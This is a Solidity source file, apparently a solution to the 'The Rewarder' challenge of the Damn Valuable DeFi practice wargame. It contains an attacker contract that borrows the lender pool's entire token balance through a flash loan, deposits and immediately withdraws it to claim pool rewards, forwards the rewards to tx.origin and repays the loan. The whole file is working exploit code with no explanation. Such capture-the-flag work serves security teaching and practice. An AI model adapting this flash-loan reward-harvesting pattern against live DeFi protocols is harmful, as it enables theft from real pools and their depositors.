// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";



contract TheRewarderPoolAttacker {

    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    TheRewarderPool public immutable rewarderPool;

    constructor(address liquidityTokenAddress,address rewardTokenAddress,address rewarderPoolAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);

    }

    function getFlashLoan(address loanerAddress) external {
        FlashLoanerPool(loanerAddress).flashLoan(liquidityToken.balanceOf(loanerAddress));
    }

    function receiveFlashLoan(uint amount) external {
        liquidityToken.approve(address(rewarderPool),amount);  
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        rewardToken.transfer(tx.origin,rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender, amount);

    }

}